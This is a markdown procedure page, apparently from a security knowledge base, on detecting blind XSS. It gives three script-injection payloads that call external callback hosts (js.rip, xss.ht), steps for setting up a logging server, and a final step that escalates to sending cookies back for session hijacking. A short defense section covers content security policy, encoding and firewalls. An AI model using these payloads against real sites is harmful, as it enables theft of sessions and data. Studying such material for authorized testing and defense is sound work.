---
type: procedure
description: >-
  This procedure outlines how to detect blind XSS vulnerabilities by injecting
  payloads that load external scripts and monitor for callbacks on
  attacker-controlled servers.
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.204154+00:00'
updated_at: '2023-04-10T20:21:54.431010+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Blind XSS]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/XSS Hunter]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Blind-XSS-Detection-Using-External-Payloads

## Summary

This procedure demonstrates how to hunt for blind Cross-Site Scripting (XSS) vulnerabilities in web applications by injecting payloads that load JavaScript from external attacker-controlled domains. Unlike reflected or stored XSS, blind XSS does not provide immediate visual feedback, but success is confirmed by monitoring incoming requests to the external server, enabling detection of vulnerabilities in logs, admin panels, or user-generated content areas.

## Description

Blind XSS occurs when malicious scripts are injected into areas of a web application where the output is not visible to the attacker, such as internal portals, error logs, or backend systems. By using payloads that beacon back to an external server (e.g., via script src or AJAX requests), attackers can confirm execution without direct observation. This technique is particularly useful for identifying vulnerabilities in complex applications like customer support tickets or admin interfaces. The procedure involves selecting appropriate payloads, injecting them into potential entry points, and monitoring for callbacks. Prerequisites include basic knowledge of web application structure and access to an external hosting service for payloads. Expected outcomes include confirmation of vulnerability exploitation, potentially leading to session hijacking, data theft, or further attacks.

## Requirements

1. Access to the target web application, such as through a user account or public-facing forms.
2. Knowledge of common XSS payload variations and input sanitization bypass techniques.
3. A web browser for manual testing or an intercepting proxy like Burp Suite for advanced injection.
4. An external server or service (e.g., xss.ht or a custom domain) to host the callback endpoint and log requests.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding) on all user inputs, especially in non-visible areas like logs or databases.
- Deploy Content Security Policy (CSP) headers to restrict script sources, blocking external domains like js.rip or xss.ht.
- Regularly scan web applications for XSS vulnerabilities using automated tools like OWASP ZAP or Burp Suite Scanner, and monitor server logs for anomalous external requests.
- Use Web Application Firewalls (WAFs) to detect and block common XSS payload patterns.

## Objectives

1. Identify potential injection points in the web application that may be vulnerable to blind XSS.
2. Confirm the presence of a blind XSS vulnerability by injecting payloads and observing callbacks on the external server.
3. Leverage the confirmed vulnerability to exfiltrate sensitive information, such as cookies or session tokens, or perform actions on behalf of the victim.

## Instructions

### Step 1: Set Up External Callback Server

**Context**: Prepare an attacker-controlled endpoint to receive notifications when the payload executes in the victim's browser. This allows confirmation of blind XSS without direct visibility.

Choose a service like xss.ht for quick setup or host your own simple logging server. Register a subdomain (e.g., custom.xss.ht) and ensure it logs incoming requests, including headers like User-Agent, cookies, and referer.

**Expected Output**: A unique URL or subdomain ready for payload integration, with logging enabled to capture request details.

### Step 2: Identify Injection Points

**Context**: Locate areas in the application where user input is reflected or stored without immediate visibility, such as search fields, comment sections, or admin logs.

Navigate the web application and test forms, URL parameters, or POST data fields. Use a proxy to inspect how inputs are processed.

**Expected Output**: A list of potential vulnerable entry points, such as a "feedback" form or error reporting field.

### Step 3: Inject Blind XSS Payload

**Context**: Insert the payload into the identified injection point to execute JavaScript that loads an external script, triggering a callback to your server.

Use the payloads from [[codes/Blind-XSS-External-Script-Payloads]]:

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

Replace `<custom.name>` with a unique identifier (e.g., victim1) and `<custom.subdomain>` with your registered subdomain. Submit the form or request containing the payload.

**Expected Output**: No immediate visual change on the page, but a successful injection will result in a request to your external server.

### Step 4: Monitor for Callbacks

**Context**: Verify payload execution by checking the external server logs for incoming requests from the victim's browser.

Access your callback server's logs or dashboard. Look for requests containing the victim's session data or IP.

**Expected Output**: Log entries showing HTTP GET requests to your endpoint, including details like cookies or DOM elements if the payload is enhanced.

### Step 5: Escalate if Confirmed

**Context**: Once a callback confirms execution, modify the payload to exfiltrate data or perform actions.

Update the external script to capture and send document.cookie or location.href back to your server.

**Expected Output**: Additional callbacks with stolen data, enabling further exploitation like session hijacking.
